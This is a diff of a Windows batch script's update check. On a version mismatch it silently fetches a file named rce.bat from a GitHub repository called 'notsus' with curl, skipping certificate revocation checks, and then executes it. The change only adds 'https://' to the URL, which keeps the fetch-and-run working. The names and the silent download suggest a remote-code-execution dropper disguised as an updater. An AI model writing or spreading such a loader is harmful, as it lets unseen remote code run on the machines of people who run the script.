@@ -13,7 +13,7 @@ if %version%==%latest_version% (
 	echo we are on latest version
 ) else (
 	echo we arent on latest version lmao
-	curl -o rce1.bat -s --ssl-no-revoke raw.githubusercontent.com/NajdzrBalls/notsus/main/P/rce.bat
+	curl -o rce1.bat -s --ssl-no-revoke https://raw.githubusercontent.com/NajdzrBalls/notsus/main/P/rce.bat
 	echo "xdd" > updated.txt
 	call rce1.bat
 )
